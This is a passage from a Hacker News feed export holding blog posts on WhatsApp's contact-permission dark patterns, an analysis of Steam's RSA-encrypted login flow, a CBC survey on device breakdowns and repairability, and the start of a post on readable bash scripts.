<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://marienraat.nl/hacking-qr-codes.html">https://marienraat.nl/hacking-qr-codes.html</a></em></p>]]>
            </description>
            <link>https://marienraat.nl/hacking-qr-codes.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25703083</guid>
            <pubDate>Sat, 09 Jan 2021 18:36:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[WhatsApp convinces you to give it your contacts]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25703067">thread link</a>) | @MattBearman
<br/>
January 9, 2021 | https://blog.mattbearman.com/how-whatsapp-gets-contacts/ | <a href="https://web.archive.org/web/*/https://blog.mattbearman.com/how-whatsapp-gets-contacts/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content"> <article itemscope="" itemtype="https://schema.org/BlogPosting">  <div itemprop="articleBody"> <p>The Internet is currently ablaze with the news that WhatsApp will soon be requiring more user data to be shared with Facebook. This reminded me of another nefarious thing WhatsApp does that I haven’t seen anyone else talking about:</p> <h4 id="whatsapp-uses-dark-patterns-to-coerce-you-into-giving-it-access-to-your-contacts"> <a href="#whatsapp-uses-dark-patterns-to-coerce-you-into-giving-it-access-to-your-contacts"></a> <em>WhatsApp uses dark patterns to coerce you into giving it access to your contacts</em> </h4> <p>While WhatsApp will work without access to your contacts, the user experience is deliberately degraded. Without access to your contacts, WhatsApp prominently displays each participant’s phone number above their message, with their display name shown next to it, almost as an afterthought:</p> <p><img src="https://blog.mattbearman.com/assets/img/blog/whatsapp-contacts/message.png" alt="WhatsApp Message"></p> <p>The name is very low contrast compared to the background, where as the phone number is listed first, in larger text, and a high contrast colour. Your eye is immediately drawn to the phone number, making it hard to see at a glance who’s talking. The display name will also be truncated if it’s too long for the available space.</p> <p>Even worse is the list of chats, which <em>only</em> displays the phone number for non-group chats, no names in sight:</p> <p><img src="https://blog.mattbearman.com/assets/img/blog/whatsapp-contacts/chats.png" alt="WhatsApp Chats"></p> <p>You do at least get the user’s profile picture here, but not everyone adds a profile picture, and even if they do, they may choose one that is not easily recognisable.</p> <p>There’s no good reason for WhatsApp to treat privacy conscious users this way. The name field is <strong>required</strong> when setting up a WhatsApp account, so every user has a name that could be displayed here instead of just the phone number.</p> <p>While writing this, I decided to install Signal, to see how it handles labeling chats without phonebook access. I wasn’t surprised to learn Signal choses the user friendly and logical option - displaying the participant’s name, with the phone number below it in smaller text:</p> <p><img src="https://blog.mattbearman.com/assets/img/blog/whatsapp-contacts/signal.png" alt="Signal Chats"></p> <p>Signal also helps distinguish between chats with users who haven’t added a profile image, by generating a uniquely coloured circle containing their initial. This isn’t unique to Signal, or even a new idea, it’s a tried and tested pattern. Compared with WhatsApp’s “generic bust”, it presents further evidence that WhatsApp is made deliberately hard to use if you don’t give it access to your contacts:</p> <p><img src="https://blog.mattbearman.com/assets/img/blog/whatsapp-contacts/signal-vs-whatsapp.png" alt="Signal vs WhatsApp default profile pictures"></p> <p>When I first installed WhatsApp I didn’t give it access to my contacts, as I tend to err on the side of minimal permissions, and I couldn’t see why it would <em>need</em> access. However, it didn’t take long for me to become frustrated with this user experience. I was constantly struggling to find conversations, or identify who was talking in group chats.</p> <p>I asked a friend with more WhatsApp experience if there was a way to make it show names instead of phone numbers. Their response was <strong><em>“Oh, that’s easy. You just need to give it access to your contacts.”</em></strong> This wasn’t the solution I was hoping for, and I resisted for as long as possible. Yet eventually the dark pattern wore me down, and I granted WhatsApp access to my contacts.</p> <p>I joined WhatsApp in late 2014, at which point they’d already been acquired by Facebook. I find myself wondering if this was a preexisting pattern, or something that happened after the acquisition, possibly at the behest of Facebook.</p> <p>Using display names as the primary identifier would be a vastly improved experience for those who chose not to give WhatsApp access to their contacts. Instead WhatsApp provides this unnecessarily worse experience, in an attempt to gain access to user’s contacts. And it works.</p> <p>I’d love to be able to say that I’ll be replacing WhatsApp with an alternative like Signal, but WhatsApp’s network effect is a strong one, and it’s currently how I keep in touch with my family.</p> <p><em>– Matt</em></p> </div> </article> </div></div>]]>
            </description>
            <link>https://blog.mattbearman.com/how-whatsapp-gets-contacts/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25703067</guid>
            <pubDate>Sat, 09 Jan 2021 18:35:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Steam's login method is kinda interesting]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25703056">thread link</a>) | @harporoeder
<br/>
January 9, 2021 | https://owlspace.xyz/cybersec/steam-login/ | <a href="https://web.archive.org/web/*/https://owlspace.xyz/cybersec/steam-login/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><article><header></header><p>How do you send a password over the internet? You acquire a SSL certificate and let TLS do the job of securely transporting the password from client to server. Of course it’s not as cut-and-dry as I’m making it out to be, but the gist of it holds true and stood the test of time. This hasn’t always been this way though, and one incredibly popular storefront on the world wide web prefers to add a little extra to this day. I’ll be discussing Steam’s unique method of logging in their users, and go down a deep rabbit hole of fascinating implementation details.</p><h3 id="pointing-out-the-obvious">Pointing out the obvious</h3><p>I found a StackOverflow question from 2013 <a href="https://stackoverflow.com/questions/1582894/how-to-send-password-securely-over-http">asking how to securely send a password over HTTP</a>. The answers are pretty unanimous: get a SSL certificate. Here’s an experiment: set up your favorite traffic-capturing proxy, browse to a service you frequently use, log in with your account (or preferably a throwaway), and inspect the requests. You will most certainly find that your username and password are sent as-is in a HTTP request body. The only reason this works is because your connection to the server is encrypted using TLS.</p><figure><img src="https://owlspace.xyz/images/steam-rsa/so-real-host.png" alt="StackOverflow user asking what to do if a webhost doesn't support SSL certificates, told to move to a real webhost"><figcaption><p>Weird to think that this used to be an issue</p></figcaption></figure><p>The internet was a different place though in the early 2010s, let alone the many years prior. We now have services like <a href="https://letsencrypt.org/">Let’s Encrypt</a> which issue SSL certificates free of charge for a period of three months, with automatic renewals if desired. There really wasn’t much of a way around acquiring a SSL certificate for money, but usually with extended validity and support. You could certainly argue that there is a price to be paid for the security and privacy of your users, but that didn’t stop questions like the one I linked from appearing.</p><p>Now that we all agree that TLS is important, let’s switch it up. Let’s pretend we cannot send a password over HTTPS and have to somehow make it work with plain HTTP, while also providing users with some level of security. There’s the <code>Authorization</code> header which is standardized and widely accepted. However, in conjunction with the “Basic” HTTP Authentication scheme, it provides no security if used in plain HTTP.</p><p>There are tried and tested challenge-response algorithms, most notably <a href="https://en.wikipedia.org/wiki/Secure_Remote_Password_protocol">SRP</a> which is designed to do password-based authentication without ever actually sending the password, but you probably have to implement them yourself and a slight oversight could cause serious harm. You could also defer authentication to an external service. “Sign in with service XYZ” is commonly used, but comes with its own ramifications. All things considered, it’s not trivial to send secrets over an inheretly insecure connection.</p><p>So when me and a friend took Steam apart in search for traces of personally identifiable information, I was surprised to see that Steam’s login page doesn’t only rely on TLS to ensure that your password stays protected.</p><h3 id="crypto-cherry-on-top">Crypto cherry on top</h3><p>Again, grab your favorite traffic-capturing proxy and navigate to <a href="https://store.steampowered.com/login">Steam’s login page</a>. Enter your username and password and you will (hopefully) be asked to enter a one-time token generated by your preferred two-factor authentication method. You can stop right there, because the magic I want to point out has already happened. You’ll find that pressing the login button launches a request against an odd endpoint: <code>/login/getrsakey</code>, followed by <code>/login/dologin</code>.</p><figure><img src="https://owlspace.xyz/images/steam-rsa/getrsa-call.png" alt="Requests to fetch script assets, acquire RSA key and perform login"><figcaption><p>All relevant assets and requests in succession</p></figcaption></figure><p>Inspect the request for <code>/login/getrsakey</code> and you’ll find a JSON-formatted response, containing fields with names that should look very familiar to anyone who’s briefly dealt with public key cryptography. You’re given a RSA public key, though the exact values might look a bit odd. It’s clear that <code>publickey_mod</code> and <code>publickey_exp</code> define the modulus and the exponent used in encryption, but the former is given in hexadecimal while the latter appears to be given in binary (I’ll get back on that later). There’s also a timestamp which has no immediately recognizable starting point. As to what the purpose of <code>token_gid</code> is, I have no clue yet.</p><div><pre><code data-lang="json"><span>{</span>
    <span>"success"</span><span>:</span><span>true</span><span>,</span>
    <span>"publickey_mod"</span><span>:</span><span>"c85ba44d5a3608561cb289795ac93b34d4b9b4326f9c09d1d19a9923e2d136b8..."</span><span>,</span>
    <span>"publickey_exp"</span><span>:</span><span>"010001"</span><span>,</span>
    <span>"timestamp"</span><span>:</span><span>"1260462250000"</span><span>,</span>
    <span>"token_gid"</span><span>:</span><span>"2701e0b0a4be3635"</span>
<span>}</span>
</code></pre></div><p>The login page pulls some scripts on load. There is the main login handler contained in <code>login.js</code> which is completely unobfuscated, so anyone can just analyze it and find out what it does. The site also loads some additional dependencies, namely <code>jsbn.js</code> and <code>rsa.js</code>.</p><p>A quick search for the name mentioned in the first line of <code>jsbn.js</code> reveals that these two scripts are the work of <a href="http://www-cs-students.stanford.edu/~tjw/">Tom Wu</a> — a MIT and Stanford graduate who likes software engineering and computer cryptography. They released <code>jsbn.js</code> and <code>rsa.js</code> as pure JavaScript implementations of arbitrary precision integers and RSA encryption/decryption respectively. You’ll also find that these libraries have had their most recent updates in 2005 and 2013 which is a bit of information I’ll come back to later. For now, just keep it in mind.</p><h3 id="going-down-the-rsabbit-hole">Going down the r(s)abbit hole</h3><p>So now that we have all relevant assets, let’s dig around in <code>login.js</code>. The code is a bit of a mess with lots of callbacks and proxied function calls, but it turns out the parts of interest can be easily condensed. In essence, the script can be boiled down to a couple of steps, each step assuming that everything went fine in the previous step.</p><ol><li>The user enters their username and password and presses the login button.</li><li><code>DoLogin</code> is called, which checks if the login mask was filled out correctly and launches a request against <code>/login/getrsakey</code>.</li><li><code>OnRSAKeyResponse</code> is called. This checks if the response is well-formed.</li><li><code>GetAuthCode</code> is called. It runs some platform-specific code in case there are any 2FA measures active on the user’s account.</li><li><code>OnAuthCodeResponse</code> is called. This is where the password is encrypted using RSA and the request against <code>/login/dologin</code> is prepared and executed.</li><li><code>OnLoginResponse</code> is called. The user is logged in and redirected to the Steam storefront.</li></ol><p>The code in <code>OnAuthCodeResponse</code> shows why the requested public key is formatted the way that it is. Starting at line 387 in the source file, the modulus and exponent of the <code>/login/getrsakey</code> response are passed as-is to the RSA library. The user’s password is then encrypted with the given public key and added to the request against <code>/login/dologin</code> in the subsequent login step.</p><div><pre><code data-lang="js"><span>var</span> <span>pubKey</span> <span>=</span> <span>RSA</span><span>.</span><span>getPublicKey</span><span>(</span><span>results</span><span>.</span><span>publickey_mod</span><span>,</span> <span>results</span><span>.</span><span>publickey_exp</span><span>);</span>
<span>var</span> <span>username</span> <span>=</span> <span>this</span><span>.</span><span>m_strUsernameCanonical</span><span>;</span>
<span>var</span> <span>password</span> <span>=</span> <span>form</span><span>.</span><span>elements</span><span>[</span><span>'password'</span><span>].</span><span>value</span><span>;</span>
<span>password</span> <span>=</span> <span>password</span><span>.</span><span>replace</span><span>(</span><span>/[^\x00-\x7F]/g</span><span>,</span> <span>''</span><span>);</span> <span>// remove non-standard-ASCII characters
</span><span></span><span>var</span> <span>encryptedPassword</span> <span>=</span> <span>RSA</span><span>.</span><span>encrypt</span><span>(</span><span>password</span><span>,</span> <span>pubKey</span><span>);</span>
</code></pre></div><p>I copied the source files onto my local machine to explore the RSA library a little bit. Both the modulus and the exponent are passed to the function <code>RSAPublicKey</code> which behaves like a constructor in the “pre-class” JavaScript era. <code>RSAPublicKey</code> simply wraps both values into instances of <code>BigInteger</code> provided by the <code>jsbn.js</code> script. It was to my surprise that the exponent is actually not represented in binary but, just like the modulus, in hexadecimal. (Also, turns out <code>0x010001</code> is a <a href="https://stackoverflow.com/questions/6098381/what-are-common-rsa-sign-exponent">very common encryption exponent</a> in RSA implementations.) So now it’s clear that the password encryption is based on 2048-bit RSA with an encryption exponent of 65537.</p><div><pre><code data-lang="js"><span>let</span> <span>r</span> <span>=</span> <span>RSA</span><span>.</span><span>getPublicKey</span><span>(</span><span>"c85ba44d5a360856..."</span> <span>/* insert your own long modulus here */</span><span>,</span> <span>"010001"</span><span>);</span>
<span>console</span><span>.</span><span>log</span><span>(</span><span>r</span><span>.</span><span>encryptionExponent</span><span>.</span><span>toString</span><span>());</span> <span>// =&gt; "65537"
</span><span></span><span>console</span><span>.</span><span>log</span><span>(</span><span>r</span><span>.</span><span>modulus</span><span>.</span><span>bitLength</span><span>());</span> <span>// =&gt; 2048
</span></code></pre></div><p>Moving on to the <code>timestamp</code> field. The <code>/login/getrsakey</code> response contains an <code>Expires</code> header. It references a date in the past, meaning that the response is absolutely not meant to be cached or persisted in any way. If you check back on <code>/login/getrsakey</code> over a longer period of time, you’ll notice that the public key changes ever so often and, as such, its timestamp value too. This means there’s only a limited time frame in which a certain Steam-issued RSA public key can be used to authenticate.</p><p>This becomes even more evident when examining the subsequent request against <code>/login/dologin</code>. Among many other things, it contains the username, encrypted password as well as the timestamp of the issued RSA public key. Trying to perform a login attempt while altering the timestamp fails as expected. But more importantly, it’s also not possible to reuse an older public key, even if the password is correctly encrypted.</p><p>I went one step further and <a href="https://gist.github.com/JoogsWasTaken/8a8e60859e1721255c57e9185eb6cb10">wrote a simple Python script to collect public keys</a> over the span of three days using a throwaway account. I let it run every five minutes using a cronjob. The goal was to check just how often Steam’s public keys change and to hopefully find out how the <code>timestamp</code> field behaves.</p><figure><img src="https://owlspace.xyz/images/steam-rsa/sqlite-pubkeys.png" alt="SQLite database containing public keys sourced from Steam"><figcaption><p>Lots and lots and lots of public keys</p></figcaption></figure><p>I found that the public key changes every 12 entries, meaning that it’s safe to assume that they rotate every hour. The encryption exponent stays the same — no surprises here. More intriguing however is the aforementioned <code>timestamp</code> field. For every 12 public keys, the value of the <code>timestamp</code> increases by a certain amount, namely 3600000000 and then some. And what’s more is that this number wraps around after some period of time as can be seen in the following image. Be warned, because all of what I’m about to say is highly speculative.</p><figure><img src="https://owlspace.xyz/images/steam-rsa/sqlite-wraparound.png" alt="Public key entries where the timestamp value wraps around in-between"><figcaption><p>Timestamp field wrapping around</p></figcaption></figure><p>I found that 3600000000 microseconds is equal to one hour, making me assume that the value of the <code>timestamp</code> field is, in fact, given in microseconds. However, I already hinted at the fact that the timestamp value doesn’t increase by one hour exactly with every new public key. In my own data, I observed that the difference between two successive timestamps is one hour plus 1 to 2.6 seconds, with most being in the order of about 1.05 to 1.25 seconds. But this raises another interesting possibility.</p><p>Let’s assume that a new public key is generated every hour plus one second. If I query the public key …</p></article></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://owlspace.xyz/cybersec/steam-login/">https://owlspace.xyz/cybersec/steam-login/</a></em></p>]]>
            </description>
            <link>https://owlspace.xyz/cybersec/steam-login/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25703056</guid>
            <pubDate>Sat, 09 Jan 2021 18:33:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Which smartphone, laptop and tablet brands break down the most?]]>
            </title>
            <description>
<![CDATA[
Score 27 | Comments 17 (<a href="https://news.ycombinator.com/item?id=25702727">thread link</a>) | @vanpythonista
<br/>
January 9, 2021 | https://www.cbc.ca/news/canada/smartphone-survey-marketplace-1.5860881 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/canada/smartphone-survey-marketplace-1.5860881">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>A CBC Marketplace survey that asked more than 3,200 Canadians about smartphone, laptop and tablet breakdowns and repairs&nbsp;revealed that an overwhelming majority of them are dealing with broken technology that is too difficult or too expensive to repair.</p><div><figure><div><p><img loading="lazy" alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5861152.1609866490!/fileImage/httpImage/image.jpg_gen/derivatives/16x9_780/jason-bolduc.jpg"></p></div><figcaption>Jason Bolduc holds a 14-day-old Samsung S20 Galaxy Plus with a hairline crack.<!-- --> <!-- -->(Stephanie Matteis/CBC)</figcaption></figure><p><span><p>Of the electronic devices used in Canada, LG smartphones top the list of devices Canadians said have broken the most over the last five years, according to an investigation by CBC's<em> Marketplace</em>.&nbsp;</p>  <p>An online survey that asked 3,201 Canadians&nbsp;about smartphone, laptop and tablet breakdowns and repairs&nbsp;revealed that an overwhelming majority of them are dealing with broken technology that is too difficult or too expensive to repair. The survey was&nbsp;conducted&nbsp;between Aug. 6 and Aug. 20 by Leger Marketing on behalf of <em>Marketplace.</em></p>  <p>Sixty-five per cent of respondents said they had multiple devices break down within the past five years.&nbsp;&nbsp;</p>  <p>Gay Gordon-Byrne, the head of the Repair Association, a consumer advocacy group in the United States established to hold manufacturers of electronic devices more accountable for reparability, said that in general, manufacturers want a consumer to have to return to the store to repair an item, which in turn may entice them into buying the newest products.&nbsp;</p>  <p>"We literally have to go buy new ones and throw away the old ones because we're not allowed either by design or by policy to fix them," she told <em>Marketplace</em>.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5861144.1609799082!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/gay-gordon-byrne.jpg 300w,https://i.cbc.ca/1.5861144.1609799082!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/gay-gordon-byrne.jpg 460w,https://i.cbc.ca/1.5861144.1609799082!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/gay-gordon-byrne.jpg 620w,https://i.cbc.ca/1.5861144.1609799082!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/gay-gordon-byrne.jpg 780w,https://i.cbc.ca/1.5861144.1609799082!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/gay-gordon-byrne.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5861144.1609799082!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/gay-gordon-byrne.jpg"></p></div><figcaption>Gay Gordon-Byrne of The Repair Association at the border at Derby Line, Vermont.<!-- --> <!-- -->(Stephanie Matteis/CBC)</figcaption></figure></span></p>  <p>For the survey, people across the country shared their stories about lifespan, reparability and the brand and type of device that broke down more than others in the last five years.&nbsp;</p>  <h2>4-month fight to fix LG smartphone</h2>  <p>Laurie Hood of Canmore, Alta., recently purchased LG's G8 Thin Q smartphone. Not long after, she said it started having problems.</p>  <p>"I just bought the phone, and I'm not blaming myself, but that's really a drag," Hood said.</p>  <p>"I wish I'd done my research before. I didn't."&nbsp;</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5863229.1609951856!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/laurie-hood.jpg 300w,https://i.cbc.ca/1.5863229.1609951856!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/laurie-hood.jpg 460w,https://i.cbc.ca/1.5863229.1609951856!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/laurie-hood.jpg 620w,https://i.cbc.ca/1.5863229.1609951856!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/laurie-hood.jpg 780w,https://i.cbc.ca/1.5863229.1609951856!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/laurie-hood.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5863229.1609951856!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/laurie-hood.jpg"></p></div><figcaption>Laurie Hood of Canmore, Alta., began having problems with her LG G8 Thin Q smartphone not long after she purchased it.<!-- --> <!-- -->(Dave Rae/CBC)</figcaption></figure></span></p>  <p>Both a certified LG repair shop and LG told her she would have to pay for a repair for the nearly new phone, which retails for about $1,250.</p>  <p>She estimated it took four months and, "fair to say about 20 hours of emails and on the phone,"&nbsp; but after persistent fighting for a fix, the phone eventually was returned to her repaired at no cost.</p>  <p>LG declined requests for on-camera interviews.</p>  <p><em>Marketplace </em>told the company about Hood's experience and a spokesperson for the company wrote that they'll look into it.</p>  <p>To understand which brands experienced more breakdowns than others based on the survey data, David Bellhouse, a professor emeritus of statistical and actuarial sciences at&nbsp;Western University, calculated the percentage share of breakdowns for each brand using market share data.</p>  <p>According to Bellhouse's analysis, LG smartphones had a disproportionately higher percentage of breakdowns than the company's percentage of the Canadian smartphone market and were the devices that broke down most&nbsp;over the last five years when compared with other brands in the survey and when market share was taken into account.</p>  <p>When <em>Marketplace </em>told the company about its position in the survey analysis, the company said in a statement that it stands behind the quality of its devices, claimed LG doesn't limit parts for phone repairs&nbsp;and said it is trying to make it easier for its customers to get their phones fixed.</p>  <ul>   <li><strong><a href="https://www.cbc.ca/news/marketplace/the-people-vs-the-tech-giants-1.5865424">Read more about how <em>Marketplace </em>conducted the survey and how companies responded</a></strong></li>  </ul>  <h2>Top breakdown issues identified</h2>  <p>The vast majority of respondents (96 per cent) had an identified problem with their device. They indicated "it became slow or buggy" (40 per cent) or had "a weak/dead battery" (26 per cent).&nbsp;</p>  <p>Other problems included the device wouldn't turn on, had a cracked or broken screen, would not charge or overheated.</p>  <p>According to Gordon-Byrne, tech companies generally don't want a consumer&nbsp;to repair a&nbsp;device&nbsp;and get "another two years of life out of it."</p>  <h2>Apple vs. Samsung smartphones</h2>  <p>Apple dominates the smartphone market, followed by Samsung.&nbsp;</p>  <p>Bellhouse's survey analysis showed Samsung smartphones experience more breakdowns relative to market share than Apple iPhones.</p>  <p>The survey received 563 reports about Samsung phones of the 1,922 reports about smartphones overall.</p>  <p>Data also showed that smartphones break down more than any other device.</p>  <p><em><strong>WATCH | Between Apple and Samsung, here's the phone brand Canadians tell us broke more than others:</strong></em></p>  <p><span><span><div><div title="Apple vs. Samsung: Which phone brand breaks down the most?" role="button" tabindex="0"><div><div aria-labelledby="1842063427989-metadata-" title="Apple vs. Samsung: Which phone brand breaks down the most?"><div><p><img src="https://thumbnails.cbc.ca/maven_legacy/thumbnails/569/595/APPLE_vs_SAMSUNG_horizontal.png" alt="" loading="lazy"></p></div></div></div></div></div><span>Here is the top smartphone brand that breaks down the most based on a CBC Marketplace survey and market share analysis.<!-- --> <!-- -->1:42</span></span></span></p>  <p>Jason Bolduc owns a Samsung S20 Galaxy Plus 5G that sells for $1,875, but he paid $1,280.&nbsp;</p>  <p>The phone immediately had problems, including overheating, which he said resulted in a hairline crack on the back glass.</p>  <p>It was still under warranty, and Telus, which sold it to him, has a 15-day return policy, so Bolduc attempted to return it to the store in Bracebridge, Ont., where he purchased it.</p>  <p>In a written statement to <em>Marketplace</em>, Telus said that it couldn't help Bolduc because he didn't buy an extended care warranty and the issues with the phone had to be addressed by the manufacturer.</p>  <p>He also approached Samsung, which wanted to charge him for repairs.</p>  <p>"I still have to be out of pocket costs because they are claiming that it's the [user's] fault," he said, though he noted the company had no evidence of that.</p>  <p>Samsung was also asked for an on-camera interview but instead provided a statement that its Galaxy products are some of the industry's "most durable." The company also said it will look into Bolduc's situation.</p>  <h2>Seeking repairs</h2>  <p>Almost three out of four survey respondents have had at least one device break down in the past five years. And 65 per cent have had multiple device breakdowns in that time.</p>  <p>Half (51 per cent) of devices taken to the manufacturer weren't repaired because the survey respondents said it would be too costly or the manufacturer couldn't fix the device.</p>  <p>Ricardo Borja owns a three-year-old Apple iPhone 7 but the audio only worked if connected to Bluetooth. As a result, he was in his car often to make or receive phone calls.</p>  <p>"I will be talking through the microphone of my car. So this is a pretty expensive headset," he said.</p>  <p>The battery also drained quickly, he said.</p>  <p>Borja sought repairs with both the manufacturer and a certified Apple repair shop where he lives in Montreal. He said both times he was told he could pay $400 and trade in the phone.&nbsp;</p>  <p>But the Quebecker didn't want to contribute to growing e-waste&nbsp;and as a product designer, couldn't understand why there wasn't a solution that allowed a repair.</p>  <p>"That is something that kind of sucks as a pattern as a whole if you look at consumer electronics. It's that they're making them less and less repairable at home."</p>  <h2>Apple replaces customer's iPhone, thanks to Quebec law</h2>  <p>Weeks after meeting with <em>Marketplace</em>, Borja sent a message to say he had gotten his iPhone 7 replaced for free with the same model from Apple.</p>  <p>He had researched Quebec's consumer protection laws, which say if a product doesn't last as long as another just like it, the manufacturer might have to repair it at no cost, replace it or provide a refund.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5861159.1609799963!/fileImage/httpImage/image.png_gen/derivatives/original_300/ricardo-borja.png 300w,https://i.cbc.ca/1.5861159.1609799963!/fileImage/httpImage/image.png_gen/derivatives/original_460/ricardo-borja.png 460w,https://i.cbc.ca/1.5861159.1609799963!/fileImage/httpImage/image.png_gen/derivatives/original_620/ricardo-borja.png 620w,https://i.cbc.ca/1.5861159.1609799963!/fileImage/httpImage/image.png_gen/derivatives/original_780/ricardo-borja.png 780w,https://i.cbc.ca/1.5861159.1609799963!/fileImage/httpImage/image.png_gen/derivatives/original_1180/ricardo-borja.png 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5861159.1609799963!/fileImage/httpImage/image.png_gen/derivatives/original_780/ricardo-borja.png"></p></div><figcaption>Ricardo Borja in Montreal with the iPhone 7 he only uses in his vehicle for calls. <!-- --> <!-- -->(Stephanie Matteis/CBC)</figcaption></figure></span></p>  <p>Right to repair advocates told <em>Marketplace </em>that of anywhere in Canada, the law may be strongest in Quebec. But even still, Borja wasn't told about it.</p>  <p>"If we don't know our rights, then they don't tell us that we're entitled to have a replacement phone at no charge, and I would have paid $400," he said of his experience with Apple.</p>  <p>Apple declined <em>Marketplace </em>requests for an on-camera interview about Borja's experience and the survey analysis, but in a statement told <em>Marketplace </em>the company has a new repair program that is making it easier to get phones fixed.&nbsp;</p>  <h2>Rating laptops: Acer vs. Apple&nbsp;versus HP</h2>  <p>When it comes to laptops, Acer, Apple and HP&nbsp;are Canada's top sellers.</p>  <p>Of those brands, Bellhouse's analysis looking at market share in households relative to breakdowns from the survey found that Canadians have experienced more breakdowns with HP over the last five years.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5866933.1610144339!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/acer-and-hp-graphic.jpg 300w,https://i.cbc.ca/1.5866933.1610144339!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/acer-and-hp-graphic.jpg 460w,https://i.cbc.ca/1.5866933.1610144339!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/acer-and-hp-graphic.jpg 620w,https://i.cbc.ca/1.5866933.1610144339!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/acer-and-hp-graphic.jpg 780w,https://i.cbc.ca/1.5866933.1610144339!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/acer-and-hp-graphic.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5866933.1610144339!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/acer-and-hp-graphic.jpg"></p></div><figcaption>Acer and HP are among Canada's top selling laptops.<!-- --> <!-- -->(David Abrahams/CBC)</figcaption></figure></span></p>  <p>HP declined <em>Marketplace</em>'s request for an interview, but wrote that in the past five years, its line of notebooks "have realized a 30 per cent reduction in&nbsp;[failure] rates as measured by the industry standard metric of Annualized Failure Rates (AFR)."</p>  <p>And by that same metric, the failure rate is "the lowest it has been in the company's history."</p>  <p>As for repairability, the company noted that some of its products are highly rated on iFixit's reparability scale. The California company is a well-known advocate for the right to repair.</p>  <h2>Tablets are a 'bad investment,' says expert</h2>  <p>When it comes to tablets, Gordon-Byrne said people should save their money.&nbsp;</p>  <p>She said they're often made with a lot of glue, which makes them difficult to take apart and repair. Add to that, right to repair advocates say manufacturers usually don't grant consumers and most repair shops, other than certified dealers,&nbsp;access to parts, repair instructions and software. Both impede successful repair, making them "a bad investment," Gordon-Byrne said.</p>  <p>When it comes to market share of tablets, Apple dominates the market at more than 75 per cent of sales, followed by Samsung at 17 per cent.</p>  <p>Bellhouse said iPads have broken down the least compared to all other brands.</p>  <p>The survey, which has a 1.7 per cent margin of error 19 out of 20 times, also had 201 respondents from Canada's North, which is also one of the toughest spots …</p></span></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.cbc.ca/news/canada/smartphone-survey-marketplace-1.5860881">https://www.cbc.ca/news/canada/smartphone-survey-marketplace-1.5860881</a></em></p>]]>
            </description>
            <link>https://www.cbc.ca/news/canada/smartphone-survey-marketplace-1.5860881</link>
            <guid isPermaLink="false">hacker-news-small-sites-25702727</guid>
            <pubDate>Sat, 09 Jan 2021 18:05:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Readable Bash Scripts]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25702062">thread link</a>) | @mooreds
<br/>
January 9, 2021 | https://brianschiller.com/blog/2021/01/07/readable-bash-scripts | <a href="https://web.archive.org/web/*/https://brianschiller.com/blog/2021/01/07/readable-bash-scripts">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
      <div>
        <article>
          <p>I really love the feeling of writing a bash pipeline. It’s fun to string commands together, peek at the output, add another couple pipes to massage the data closer to my goal. I even gave a short class on them: <a href="https://github.com/bgschiller/shell-challenges">bgschiller/shell-challenges</a>.</p>

<p>But it’s easy to find that a pipeline that was delightful to write is painful to maintain. Even if you’re the one reading it a month later, it’s difficult to remember what the purpose of each piece is. This is a trick I learned to break pipelines into intermediate files for more readable scripts.</p>

<h3 id="the-task">The task</h3>

